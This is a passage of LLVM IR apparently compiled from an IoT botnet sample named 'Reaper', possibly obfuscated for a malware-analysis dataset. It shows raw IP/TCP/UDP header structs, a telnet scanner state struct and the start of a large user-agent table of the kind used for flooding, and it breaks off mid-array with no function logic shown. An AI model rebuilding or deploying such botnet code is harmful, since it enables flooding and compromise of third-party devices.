; ModuleID = 'host/ir_bcf/Reaper.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@UserAgents = global [789 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([160 x i8], [160 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.194, i32 0, i32 